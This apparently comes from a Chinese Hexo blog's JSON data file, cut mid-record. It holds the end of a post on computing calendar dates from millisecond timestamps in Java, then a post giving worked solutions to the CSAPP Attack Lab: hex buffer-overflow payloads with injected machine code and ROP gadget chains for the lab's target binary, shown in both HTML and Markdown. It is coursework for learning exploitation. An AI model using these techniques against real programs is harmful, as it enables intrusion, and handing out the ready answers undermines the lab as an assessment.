class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyDate</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> year;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> month;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> day;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> hour;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> minute;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> second;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerSecond = <span class=\"number\">1000</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerMinute = <span class=\"number\">1000</span>*<span class=\"number\">60</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerHour = <span class=\"number\">3600</span>*<span class=\"number\">1000</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerDay = <span class=\"number\">24</span>*<span class=\"number\">3600</span>*<span class=\"number\">1000</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerPingNian = <span class=\"number\">365</span>*timePerDay;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerLeapYear = <span class=\"number\">366</span>*timePerDay;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timeOf1970And1971 = timePerPingNian+timePerPingNian;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePer4Year = (<span class=\"keyword\">long</span>)(<span class=\"number\">365.25</span>*<span class=\"number\">4</span>*timePerDay);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timeEvery400Year = timePer4Year*<span class=\"number\">100</span> - <span class=\"number\">3</span>*timePerDay;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timeOf1970To2000 = timePer4Year*<span class=\"number\">7</span>+timeOf1970And1971;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] daysPerMonth = &#123;<span class=\"number\">31</span>, <span class=\"number\">28</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> <span class=\"title\">setMinuteAndSecond</span><span class=\"params\">(<span class=\"keyword\">long</span> milliTime)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">assert</span> milliTime&lt;timePerDay;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(milliTime&gt;=timePerDay)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        hour = (<span class=\"keyword\">int</span>)(milliTime/timePerHour);</span><br><span class=\"line\">        <span class=\"keyword\">long</span> t = milliTime%timePerHour;</span><br><span class=\"line\">        minute = (<span class=\"keyword\">int</span>)(t/timePerMinute);</span><br><span class=\"line\">        t = t%timePerMinute;</span><br><span class=\"line\">        second = (<span class=\"keyword\">int</span>)(t/timePerSecond);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> <span class=\"title\">setMonthAndDay</span><span class=\"params\">(<span class=\"keyword\">long</span> milliTime, <span class=\"keyword\">boolean</span> isLeapYear)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//this func should handle  the case where milliTime == 0;</span></span><br><span class=\"line\">        <span class=\"comment\">//this func get the milliseconds within 1 year;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">assert</span> milliTime&lt;=timePerLeapYear &amp;&amp; isLeapYear || milliTime&lt;=timePerPingNian &amp;&amp; !isLeapYear;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(milliTime&gt;timePerLeapYear &amp;&amp; isLeapYear || milliTime&gt;timePerPingNian &amp;&amp; !isLeapYear) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        daysPerMonth[<span class=\"number\">1</span>] = isLeapYear ? <span class=\"number\">29</span> : <span class=\"number\">28</span>; <span class=\"comment\">//set the days of February;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">int</span> cnt = -<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">do</span>&#123;</span><br><span class=\"line\">            milliTime -= daysPerMonth[++cnt]*timePerDay;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">while</span> (milliTime&gt;=<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        month = cnt+<span class=\"number\">1</span>;  <span class=\"comment\">//for that the cnt begin from 0, but month begin from 1;</span></span><br><span class=\"line\">        <span class=\"keyword\">long</span> timeOfLastMonth = daysPerMonth[cnt]*timePerDay+milliTime;</span><br><span class=\"line\">        day = (<span class=\"keyword\">int</span>)(timeOfLastMonth/timePerDay)+<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        setMinuteAndSecond(timeOfLastMonth % timePerDay);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> <span class=\"title\">setDataFile</span><span class=\"params\">(<span class=\"keyword\">long</span> milliTime)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(milliTime&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> is1970Or1971 = milliTime&lt;timeOf1970And1971 ? <span class=\"keyword\">true</span> : <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> is20Century = milliTime&lt;timeOf1970To2000 ? <span class=\"keyword\">true</span>: <span class=\"keyword\">false</span>; </span><br><span class=\"line\">       \t<span class=\"comment\">//if equal is 2000 1 1 0:0:0</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(is1970Or1971) &#123;</span><br><span class=\"line\">            year = milliTime&gt;=timePerPingNian ? <span class=\"number\">1971</span> : <span class=\"number\">1970</span>;</span><br><span class=\"line\">            setMonthAndDay(year==<span class=\"number\">1971</span> ? milliTime-timePerPingNian : milliTime, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(is20Century) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">long</span> t = (milliTime-timeOf1970And1971)/timePer4Year;  </span><br><span class=\"line\">            <span class=\"keyword\">long</span> t1 = milliTime-timeOf1970And1971-t*timePer4Year;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">long</span> t2 = t1-timePerLeapYear;</span><br><span class=\"line\">            <span class=\"keyword\">boolean</span> isLeapYear = t2&lt;<span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">long</span> t3 = isLeapYear ? <span class=\"number\">0</span> : t2/timePerPingNian+<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            year = (<span class=\"keyword\">int</span>)(<span class=\"number\">1972</span>+t*<span class=\"number\">4</span>+t3);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">long</span> l = isLeapYear ? t1 : (t1-t3*timePerPingNian-timePerDay);</span><br><span class=\"line\">            setMonthAndDay(l, isLeapYear);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> p = milliTime-timeOf1970To2000;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> t1 = p/timeEvery400Year;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> p1 = p-t1*timeEvery400Year;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> t2 = p1/timePer4Year;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> tN = t2/<span class=\"number\">25</span>;    </span><br><span class=\"line\">      \t<span class=\"comment\">//in every 400 years, other year such as xy00(y!=0) is not leap year;</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      \t<span class=\"keyword\">long</span> p2 = p1-t2*timePer4Year;</span><br><span class=\"line\">        p2 += tN*timePerDay;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> t3 = p2-timePerLeapYear;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> isLeapYear = t3&lt;<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> t4 = isLeapYear ? <span class=\"number\">0</span> : t3/timePerPingNian+<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        year = (<span class=\"keyword\">int</span>)(<span class=\"number\">2000</span>+t1*<span class=\"number\">400</span>+t2*<span class=\"number\">4</span>+t4);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> lt = isLeapYear ? p2 : (p2-t4*timePerPingNian-timePerDay);</span><br><span class=\"line\">        setMonthAndDay(lt, isLeapYear);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><h4 id=\"设置时分秒（函数setMinuteAndSecond）\"><a href=\"#设置时分秒（函数setMinuteAndSecond）\" class=\"headerlink\" title=\"设置时分秒（函数setMinuteAndSecond）\"></a>设置时分秒（函数setMinuteAndSecond）</h4><ul>\n<li>函数的输入是 小于 每天毫秒数  的一个整数</li>\n<li>因为是从0:0:0开始计时，所以很好算</li>\n<li>直接除以每小时毫秒数，结果就是 要求的小时数</li>\n<li>然后把取模每小时毫秒数的结果除以每分钟毫秒数，算出来的结果就是分钟数</li>\n<li>以此类推，算出秒数</li>\n</ul>\n<h4 id=\"设置月和日（函数setMonthAndDay）\"><a href=\"#设置月和日（函数setMonthAndDay）\" class=\"headerlink\" title=\"设置月和日（函数setMonthAndDay）\"></a>设置月和日（函数setMonthAndDay）</h4><ul>\n<li>函数的输入为  小于  每年毫秒数  一个整数</li>\n<li>依次减去每个月的毫秒数，当减去某个月后，得到负数，说明月份就是这个月。<strong>注意，如果减去后得到0，则是下个月的第一毫秒，因为毫秒数是相对1970.1.1.0:0:0计算的。举个例子，毫秒数==一个平年的毫秒数，那么加上1970.1.1.0:0:0后，就变成1971.1.1.0:0:0，而不是1970.12.31.23:59:59</strong></li>\n<li>通过上面那个流程，得到属于一个月内的毫秒数（注意，比如说某个月的毫秒数是K，那么0~(K-1)都是属于这个月，但是K不是），然后除以每天的毫秒数，得到 P 。同样，如果整除，说明日期数是 P+1，如果不整除，那也是 P+1（注意，日期是从1开始，而不是从0开始）</li>\n</ul>\n<h4 id=\"设置年份（在函数setDataFile中）\"><a href=\"#设置年份（在函数setDataFile中）\" class=\"headerlink\" title=\"设置年份（在函数setDataFile中）\"></a>设置年份（在函数setDataFile中）</h4><ul>\n<li><p>对1970/1971特殊处理，直接判断是否毫秒数是否 $\\geq$ 一个平年的毫秒数，如果是，那么就是1971。<strong>注意，等于也是，原因如上所述。</strong>然后调用setMonthAndDay函数，设置日月</p>\n</li>\n<li><p>对1972.1.1.0:0:0到2000.1.1.0:0:0 特殊处理。先减去1970和1971的总的毫秒数，得到的结果除以每4年的毫秒数，得到H。同样，无论是否整除，年份数是在$[4H+1972, 4H+1972+3]$，整除就是$4H+1972$这一年的第一毫秒（0时0分0秒）。因为1970.1.1.0:0:0加上1970和1971总的毫秒数已经是1972.1.1.0:0:0了，再加上整数年$4H$就是(1972+4H).1.1.0:0:0了。</p>\n<p>然后减去一个闰年的毫秒数，因为从1972年算起，每四年的第一年都是闰年，如果结果是负数，说明是闰年（同样的，如果是0，那么并不是闰年，而是闰年下一年的第一毫秒）。否则，把得到结果除以每个平年的毫秒数得到 P ，就是从闰年的下一年 开始的第 P 年，所以，年份就是$1972+4H+1+P$</p>\n</li>\n<li><p>然后，因为当年份数是100的倍数时，只有当年份可以被400整除，才是闰年。而2000年正好就是每400年里的第一年，所以要先计算，毫秒数里总的有多少个400年，如果有 $t$ 个，那么年份数就是$[2000+400t, 2000+400t+399]$</p>\n<p>接下来就计算总的毫秒数减去1970到2000的毫秒数，再减去总共多少个400年的毫秒数，剩下的毫秒数里，算算有多少个4年，因为每4年是闰年。如果算出来的结果是$d$，那么年份数就是$[2000+400t+4d,2000+400t+4d+3]$</p>\n<p>接下来判断剩下的毫秒数是否小于一个闰年的毫秒数，如果是，那么就是闰年，年份数是$2000+400t+4d$。如果不是，就减去一个闰年的毫秒数，然后算一算剩下的有多少个平年的毫秒数，假设算出来的结果是$b$，那么年份数就是$2000+400t+4d+b+1$</p>\n<p>接下来调用setMonthAndDay函数设置月份日期</p>\n</li>\n</ul>\n","slug":"从时间戳（毫秒）计算日历","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/tags/算法/"},{"name":"时间戳","slug":"时间戳","permalink":"https://h-zex.github.io/tags/时间戳/"},{"name":"日历","slug":"日历","permalink":"https://h-zex.github.io/tags/日历/"}]},{"title":"CSAPP Attack Lab","date":"2017-09-16T05:18:56.000Z","path":"2017/09/16/CSAPP-Attack-Lab/","text":"CSAPP Attack Lab 本文所有答案都是传给hex2raw的文本，hex2raw会在转换好的字符串后添加换行符，所以答案里没有换行符 第一题答案123456789aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa/* this five lines fill the buf */c0 17 40 00 00 00 00 00 /* touch1's addr */ 思路 不需要传参，而且没有各种保护，直接构造一个0x28长度的字符串加上touch1的地址（直接用十六进制写），然后用hex2raw转换后输入即可AC 第二题答案123456789101112131415161718ec 17 40 00 00 00 00 00 /* touch2的地址 */48 83 ec 30/* sub $0x30, %rsp */48 c7 c7 fa 97 b9 59 /* mov $0x59b997fa,%rdi（我用的self-study版本的cookie是0x59b997fa）*/c3 /* retq */aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa aa aa aa aa /* 填充的字符串 */80 dc 61 55/* 上面的sub $0x30, %rsp指令的地址，也就是getbuf本身的ret要跳转过去的地址 */ 思路 需要传一个int参数，字符串里有可执行代码，覆盖返回地址的位置，让ret跳转到我们插进去的代码的位置 需要注意ret读取的是rsp指示的栈顶的位置，所以为了让我们自己传进去的ret能够ret到touch2的地址，需要设置rsp使之指向touch2的地址 第三题答案1234567891011121314151617181920212223242526272829fa 18 40 00 00 00 00 00 /* touch3 addr, in 0x5561dc78 */48 83 ec 30 /* sub $0x30,%rsp, in 0x5561dc80 */48 c7 c7 90 dc 61 55 /* mov $0x5561dc90,%rdi */c3 /* retq will ret to 0x5561dc78 */ 00 00 00 00 /*fill the extra space */35 39 62 39 39 37 66 61 00 /* string \"59b997fa\" ，in 0x5561dc90 */aa aa aa aa aa aa aa /* fill the extra space */ 80 dc 61 55 00 00 00 00 /* 0x5561dc80, our code's begin addr *//* * just before our attack code is run, * rsp == 0x5561dca0 * return addr in 0x5561dca0*/ 思路 比第二题只多了一个“需要在栈上放置字符串”，需要注意的是，字符串放在栈上，那么rsp就应该小于这个字符串的最低位置，否则下一个函数如果读写栈帧，就会破坏字符串 然后覆盖getbuf的存放返回地址的区域，使之跳转到我们插入的代码段的起始位置，也就是0x5561dc80 接着分配栈空间，然后把string的地址传给rdi，然后ret到touch3。需要注意，ret从栈顶读取返回地址，所以touch3的地址放在栈顶 第四题答案123456789101112131415161718aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa/* this five line fill the buf */cc 19 40 00 00 00 00 00 /* 0x4019cc pop %rax; nop; ret */fa 97 b9 59 00 00 00 00 /* 0x59b997fa */a2 19 40 00 00 00 00 00 /* 0x4019a2 movq %rax, %rdi; ret */ec 17 40 00 00 00 00 00 /* touch2 0x4017ec */ 思路 构造rop链，在0x4019ca处有b8 29 58 90 c3 mov $0xc3905829,%eax，观察字节码，在0x4019cc处的58是pop rax，从而，把cookie放在栈顶，然后调用这条指令，就可以把参数转移到rax 在0x4019a0有8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax，观察字节码，0x4019a2处有48 89 c7，也就是mov %rax, %rdi，从而把参数从rax转移到rdi，然后直接跳转过去touch2就可以了 第五题答案12345678910111213141516171819202122232425262728293031323334aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa /* this five lines fill space of buf */17 2b 40 00 00 00 00 00 /* 402b17, pop rsi,ret to this, assume that rsp is K */20 00 00 00 00 00 00 00 /* the data pop to rsi */00 00 00 00 00 00 00 00 /* the data are pop to r15 *//* after all pop, rsp is K+16 */06 1a 40 00 00 00 00 00 /* 401a06, movq rsp, rax, ret to here, rsp is K+24 */a2 19 40 00 00 00 00 00 /* 4019a2, movq rax, rdi */d6 19 40 00 00 00 00 00 /* 4019d6, lea(%rdi,%rsi,1),%rax , then string addr in rax */c5 19 40 00 00 00 00 00 /* 4019c5, mov rax, rdi */fa 18 40 00 00 00 00 00 /* 4018fa touch3 */35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 /* 0x59b997fa in here */ 思路 把字符串放在栈上，并且因为每次ret都会释放8字节，为了避免后面的函数使用栈而破坏字符串，应该把字符串放在rop链之后 用rsp构造出字符串的地址，这时候需要add或sub等算术指令或lea这个内存计算指令。找来找去，只有位于 0x4019d6的lea (%rdi,%rsi,1),%rax符合要求 为了使用lea，需要把运行到某条指令时的rsp跟字符串位置的偏移量传给rsi。这里我们使用pop指令，在0x402b16找到pop %r14，该指令第二个字节5e是pop %rsi，因为该指令跟ret之间还有pop %r15，所以栈上的数据应该是16个字节，前8个字节的数据pop给%rsi（该数据的计算在后文），后8个字节给%r15，后8个字节的数据随意构造即可。 r15是callee-saved寄存器，被调用函数不应该使用寄存器原本的值，所以r15等价于C语言函数内的局部自动变量（非参数），并且getbuf函数被我们攻击前其本身的指令已经执行完了，此时破坏r15的值不会影响getbuf。（以上只是本人目前所知的r15的相关信息推断的，或许r15还有其他跨函数的用途？？） 之后用多个mov，实现rsp mov到rax再mov到rdi 然后调用ret到lea指令，这时候，rax保存着字符串的起始地址，然后再把rax mov到rdi 接着就是touch3的地址，让mov rax rdi下面那条ret直接跳转到touch3，攻击成功 几个注意点 用vim的16进制编辑模式要加在打开vim时加-b，否则，会把诸如c0这一类大于0x3f的不属于ascii范围的字符修改成3f ret指令前释放栈帧，ret指令后rsp又加上8，所以设置字符串时如果操作rsp，需要考虑ret释放的8字节 指令的机器码放在栈上时不需要按照字节逆序排放。并且下一条指令相对于当前指令是放在更高的地址而不是更低的地址 ret指令从rsp指定的位置读出8字节的信息，所以设置跳转地址时也要对高4byte进行设置 注意gets遇到编码为0xFF的字符时不会终止读取","raw":"---\ntitle: CSAPP Attack Lab\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-09-16 13:18:56\ntags:\n- CSAPP Lab\ndescription: CSAPP 攻击实验的解答\ncategories:\n- CSAPP\n---\n\n# CSAPP Attack Lab\n\n> 本文所有答案都是传给hex2raw的文本，hex2raw会在转换好的字符串后添加换行符，所以答案里没有换行符\n\n### 第一题\n\n#### 答案\n\n```c\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\n/* this five lines fill the buf */\n\nc0 17 40 00\t00 00 00 00 \n/* touch1's addr */\n```\n\n#### 思路\n\n- 不需要传参，而且没有各种保护，直接构造一个0x28长度的字符串加上`touch1`的地址（直接用十六进制写），然后用`hex2raw`转换后输入即可AC\n\n### 第二题\n\n#### 答案\n\n```c\nec 17 40 00 00 00 00 00 \n/* touch2的地址 */\n\n48 83 ec 30\n/* sub  $0x30, %rsp */\n\n48 c7 c7 fa 97 b9 59 \n/* mov  $0x59b997fa,%rdi（我用的self-study版本的cookie是0x59b997fa）*/\n\nc3 /* retq */\n\naa aa aa aa aa aa aa aa\naa aa aa aa  aa aa aa aa \naa aa aa aa \n/* 填充的字符串 */\n\n80 dc 61 55\n/* 上面的sub $0x30, %rsp指令的地址，也就是getbuf本身的ret要跳转过去的地址 */\n```\n\n#### 思路\n\n- 需要传一个int参数，字符串里有可执行代码，覆盖返回地址的位置，让ret跳转到我们插进去的代码的位置\n- 需要注意ret读取的是rsp指示的栈顶的位置，所以为了让我们自己传进去的ret能够ret到touch2的地址，需要设置rsp使之指向touch2的地址\n\n### 第三题\n\n#### 答案\n\n```c\nfa 18 40 00 00 00 00 00 \n/* touch3 addr, in 0x5561dc78 */\n\n48 83 ec 30 \n/* sub $0x30,%rsp, in 0x5561dc80 */\n\n48 c7 c7 90 dc 61 55 \n/* mov  $0x5561dc90,%rdi */\n\nc3 \n/* retq will ret to 0x5561dc78 */   \n\n00 00 00 00 \n/*fill the extra space */\n\n35 39 62 39 39 37 66 61\t00\t\n/* string \"59b997fa\" ，in 0x5561dc90 */\n\naa aa aa aa aa aa aa \n/* fill the extra space */ \n\n80 dc 61 55 00 00 00 00 \n/* 0x5561dc80, our code's begin addr */\n\n/* \n* just before our attack code is run, \n* rsp == 0x5561dca0 \n* return addr in 0x5561dca0\n*/\n```\n\n#### 思路\n\n- 比第二题只多了一个“需要在栈上放置字符串”，需要注意的是，字符串放在栈上，那么rsp就应该小于这个字符串的最低位置，否则下一个函数如果读写栈帧，就会破坏字符串\n- 然后覆盖getbuf的存放返回地址的区域，使之跳转到我们插入的代码段的起始位置，也就是0x5561dc80\n- 接着分配栈空间，然后把string的地址传给rdi，然后ret到touch3。需要注意，ret从栈顶读取返回地址，所以touch3的地址放在栈顶\n\n### 第四题\n\n#### 答案\n\n```c\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa \naa aa aa aa aa aa aa aa \naa aa aa aa aa aa aa aa \naa aa aa aa aa aa aa aa\n/* this five line fill the buf */\n\ncc 19 40 00 00 00 00 00\t\n/* 0x4019cc\t pop %rax; nop; ret */\n\nfa 97 b9 59 00 00 00 00\t\n/* 0x59b997fa */\n\na2 19 40 00 00 00 00 00\t\n/* 0x4019a2\t movq %rax, %rdi; ret */\n\nec 17 40 00 00 00 00 00\t\n/* touch2 0x4017ec */\n```\n\n\n\n#### 思路\n\n- 构造rop链，在0x4019ca处有`  b8 29 58 90 c3 mov $0xc3905829,%eax`，观察字节码，在0x4019cc处的`58`是`pop rax`，从而，把cookie放在栈顶，然后调用这条指令，就可以把参数转移到rax\n- 在0x4019a0有`8d 87 48 89 c7 c3   lea    -0x3c3876b8(%rdi),%eax`，观察字节码，0x4019a2处有`48 89 c7`，也就是`mov %rax, %rdi`，从而把参数从rax转移到rdi，然后直接跳转过去touch2就可以了\n\n### 第五题\n\n#### 答案\n\n```c\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\t\t\n/* this five lines fill space of buf */\n\n17 2b 40 00 00 00 00 00\t \t\n/* 402b17, pop rsi,ret to this, assume that rsp is K */\n\n20 00 00 00 00 00 00 00\t\n/* the data pop to rsi */\n\n00 00 00 00 00 00 00 00\t\n/* the data are pop to r15 */\n/* after all pop, rsp is K+16 */\n\n06 1a 40 00 00 00 00 00\t\t\n/* 401a06, movq rsp, rax, ret to here, rsp is K+24 */\n\na2 19 40 00 00 00 00 00\t\t\n/* 4019a2, movq rax, rdi */\n\nd6 19 40 00 00 00 00 00\t\t\n/* 4019d6, lea(%rdi,%rsi,1),%rax , then string addr in rax */\n\nc5 19 40 00 00 00 00 00\t\t\n/* 4019c5, mov rax, rdi */\n\nfa 18 40 00 00 00 00 00\t\t\n/* 4018fa touch3 */\n\n35 39 62 39 39 37 66 61\t00 00 00 00 00 00 00 00\t\n/* 0x59b997fa in here */\n```\n\n#### 思路\n\n- 把字符串放在栈上，并且因为每次ret都会释放8字节，为了避免后面的函数使用栈而破坏字符串，应该把字符串放在rop链之后\n\n- 用rsp构造出字符串的地址，这时候需要add或sub等算术指令或lea这个内存计算指令。找来找去，只有位于 0x4019d6的`lea (%rdi,%rsi,1),%rax`符合要求\n\n- 为了使用lea，需要把运行到某条指令时的rsp跟字符串位置的偏移量传给rsi。这里我们使用pop指令，在0x402b16找到`pop %r14`，该指令第二个字节`5e`是`pop %rsi`，因为该指令跟ret之间还有`pop %r15`，所以栈上的数据应该是16个字节，前8个字节的数据pop给%rsi（该数据的计算在后文），后8个字节给%r15，后8个字节的数据随意构造即可。\n\n  > r15是callee-saved寄存器，被调用函数不应该使用寄存器原本的值，所以r15等价于C语言函数内的局部自动变量（非参数），并且getbuf函数被我们攻击前其本身的指令已经执行完了，此时破坏r15的值不会影响getbuf。（以上只是本人目前所知的r15的相关信息推断的，或许r15还有其他跨函数的用途？？）\n\n- 之后用多个mov，实现rsp mov到rax再mov到rdi\n\n- 然后调用ret到lea指令，这时候，rax保存着字符串的起始地址，然后再把rax mov到rdi\n\n- 接着就是touch3的地址，让`mov rax rdi`下面那条ret直接跳转到touch3，攻击成功\n\n### 几个注意点\n\n- 用vim的16进制编辑模式要加在打开vim时加`-b`，否则，会把诸如`c0`这一类大于`0x3f`的不属于ascii范围的字符修改成`3f`\n\n\n- ret指令前释放栈帧，ret指令后rsp又加上8，所以设置字符串时如果操作rsp，需要考虑ret释放的8字节\n- 指令的机器码放在栈上时不需要按照字节逆序排放。并且下一条指令相对于当前指令是放在更高的地址而不是更低的地址\n- ret指令从rsp指定的位置读出8字节的信息，所以设置跳转地址时也要对高4byte进行设置\n- 注意gets遇到编码为0xFF的字符时不会终止读取\n\n","content":"<h1 id=\"CSAPP-Attack-Lab\"><a href=\"#CSAPP-Attack-Lab\" class=\"headerlink\" 